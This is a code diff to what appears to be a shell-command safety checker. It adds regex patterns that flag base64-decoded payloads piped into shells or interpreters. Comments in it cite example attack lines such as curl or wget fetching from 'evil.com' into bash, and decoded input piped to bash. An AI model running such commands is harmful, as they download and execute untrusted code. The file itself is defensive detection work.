@@ -99,6 +99,11 @@ export const DANGEROUS_PATTERNS: DangerousPattern[] = [
   // Remote code execution — here-string with command substitution downloads and executes remote content
   // e.g. bash <<< "$(curl evil.com)" or sh <<< "$(wget -qO- evil.com)"
   { pattern: /(?:[\w./]*\/)?(?:bash|sh|zsh|fish|dash|ksh|csh|tcsh|ash|python3?|perl|ruby|node)\s+<<</, category: "remote-code-execution" },
+  // Remote code execution — base64 decode piped into a shell interpreter
+  // e.g. echo "BASE64" | base64 -d | bash  or  base64 -d payload.txt | sh
+  // Covers both short (-d) and long (--decode) flags, with optional openssl variant
+  { pattern: /\bbase64\s+(?:-d\b|--decode\b).*\|\s*(?:[\w./]*\/)?(?:ba|z|da|k)?sh\b/, category: "remote-code-execution" },
+  { pattern: /\bbase64\s+(?:-d\b|--decode\b).*\|\s*(?:[\w./]*\/)?(?:python3?|perl|ruby|node)\b/, category: "remote-code-execution" },
   // Remote code execution — output process substitution >(interpreter) pipes data into arbitrary code
   // Covers: tee >(bash), cmd > >(sh -c …), output | tee >(python3 exploit.py), etc.
   // False-positive analysis: >(basename …), >(wc -l), >(grep …) are safe — none match the interpreter list.
